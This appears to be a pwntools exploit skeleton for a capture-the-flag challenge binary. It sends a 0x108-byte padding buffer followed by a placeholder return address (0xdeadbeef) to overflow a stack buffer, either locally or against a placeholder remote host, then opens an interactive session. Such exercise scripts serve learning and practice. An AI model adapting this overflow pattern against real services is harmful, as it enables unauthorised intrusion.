#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    offset = 0x100 + 8
    payload = b""
    payload += b"A" * offset
    payload += p64(0xdeadbeef)
    r.sendlineafter(b"see?", payload)

    r.interactive()


if __name__ == "__main__":
    main()

